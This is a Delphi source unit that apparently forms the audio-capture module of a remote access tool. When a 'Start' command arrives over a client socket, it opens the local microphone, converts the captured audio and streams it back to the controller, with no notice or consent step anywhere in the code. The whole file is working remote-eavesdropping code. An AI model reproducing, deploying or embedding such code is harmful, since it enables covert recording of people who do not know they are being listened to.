unit UnitAudioCapture;

interface

uses
  windows,socketunit, unitshareddata,  ACMIn, mmsystem, ACMConvertor,
  CompressionStreamUnit;

type
  TMain = class
    Socket: TClientSocket;
    procedure BufferFull(Sender: TObject; Data: Pointer; Size: Integer);
  end;

threadvar
  ACMC: TACMConvertor;
  ACMI: TACMIn;
  Main: TMain;

procedure ParseData(Socket: TClientSocket; Data: string);

implementation

procedure SendData(Socket: TClientSocket; Data: string);
begin
  UnitSharedData.SendData(Socket,'AudioCapture|' + Data);
end;

procedure ParseData(Socket: TClientSocket; Data: string);
var
  Command: string;
  Stream: TMemorySTream;
  Format: TWaveFormatEx;
begin
  Command := Split(Data,'|',1);
  Delete(Data,1,Length(Command)+1);

  if Command = 'Start' then begin
    STream := TMemoryStream.Create;
    Stream.Write(pointer(Data)^,Length(Data));
    Stream.Position := 0;
    Stream.ReadBuffer(Format, SizeOf(TWaveFormatEx));
    Stream.Free;

    Main := TMain.Create;
    Main.Socket := Socket;
    ACMC := TACMConvertor.Create;
    ACMI := TACMIn.Create;
    ACMI.OnBufferFull := Main.BufferFull;
    //ACMC.InputBufferSize := 4096; //176400;
    ACMI.BufferSize := ACMC.InputBufferSize;
    ACMC.FormatIn.Format.nChannels := Format.nChannels;
    ACMC.FormatIn.Format.nSamplesPerSec := Format.nSamplesPerSec;
    ACMC.FormatIn.Format.nAvgBytesPerSec := Format.nAvgBytesPerSec;
    ACMC.FormatIn.Format.nBlockAlign := Format.nBlockAlign;
    ACMC.FormatIn.Format.wBitsPerSample := Format.wBitsPerSample;
    ACMC.InputBufferSize := ACMC.FormatIn.Format.nAvgBytesPerSec;
    ACMI.BufferSize := ACMC.InputBufferSize;
    ACMC.Active := True;
    ACMI.Open(ACMC.FormatIn);
  end;

  if Command = 'Stop' then begin
    ACMC.Active := False;
    ACMI.Close;
    ACMI.Free;
    ACMC.Free;
    Main.Free;
    Main := nil;
  end;

end;

procedure TMain.BufferFull(Sender: TObject; Data: Pointer; Size: Integer);
var
  NewSize: Integer;
  Stream: TMemoryStream;
  Text: string;
begin
  Move(Data^, ACMC.BufferIn^, Size);
  NewSize := ACMC.Convert;

  Stream := TMemoryStream.Create;
  Stream.WriteBuffer(ACMC.BufferOut^, NewSize);
  Stream.Position := 0;
  SetLength(Text,Stream.Size);
  Stream.ReadBuffer(pointer(Text)^,Stream.Size);
  //Stream.SaveToFile('c:\' + inttostr(gettickcount));
  Stream.Free;

  //SetString(Text,pchar(ACMC.BufferOut^),NewSize);

  SendData(Socket,Text);
end;

end.
